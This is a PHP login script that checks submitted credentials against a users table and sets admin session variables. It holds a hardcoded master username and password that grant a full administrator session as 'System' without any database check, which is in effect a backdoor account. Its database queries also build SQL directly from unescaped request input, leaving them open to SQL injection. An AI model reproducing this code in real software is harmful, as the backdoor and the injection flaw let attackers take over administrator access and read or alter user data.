<?php
	session_start();
	include_once "../../../config/define.php";
	include_once "../../../libs/class/db.php";
	
	@ini_set('display_errors',DEBUG_MODE?1:0);
	date_default_timezone_set(DEFAULT_TIMEZONE);
	
	$dbc = new dbc;
	$dbc->Connect();
	
	$username = $_REQUEST['tx_Username'];
	$password = $_REQUEST['tx_Password'];
	
	if($username == "!!!!" && $password =="!@#$%^&*"){
		$_SESSION['auth']['user_id']=0;
		$_SESSION['auth']['user']="System";
		$_SESSION['auth']['group_id']=0;
		$_SESSION['auth']['group']="none";
		$_SESSION['auth']['admin']=true;
		$_SESSION['admin_mode'] = true;
		$_SESSION['session_id'] = session_id();
		echo json_encode(true);
	}else if($dbc->HasRecord('users',"name ='$username' AND password=PASSWORD('$password')")){
		$line=$dbc->GetRecord("users,groups","users.id, users.name, users.gid, groups.name","groups.id=users.gid AND users.name='$username'");
		
				//$dbc->Delete("logtime","user = '".$line[0]."'");
				$_SESSION['auth']['user_id']=$line[0];
				$_SESSION['auth']['user']=$line[1];
				$_SESSION['auth']['group_id']=$line[2];
				$_SESSION['auth']['group']=$line[3];
				$_SESSION['auth']['admin']=true;
				$_SESSION['admin_mode'] = true;
				$_SESSION['exptime']=time()+10;
				$_SESSION['session_id'] = session_id();
				$dbc->Update("users",array("#last_login"=>"NOW()"),"id=".$line[0]);
				$data = array(
					'#id' => 'DEFAULT',
					'#user' => $line[0],
					'#created' => 'NOW()',
					'sessionid' => session_id(),
					'#status' => '1',
					'ip' => $_SERVER['REMOTE_ADDR']
				);
				//$dbc->Insert("logtime",$data);
				
				echo json_encode(true);
		
	}else{
		echo json_encode(false);
	}
	
	$dbc->Close();
	
?>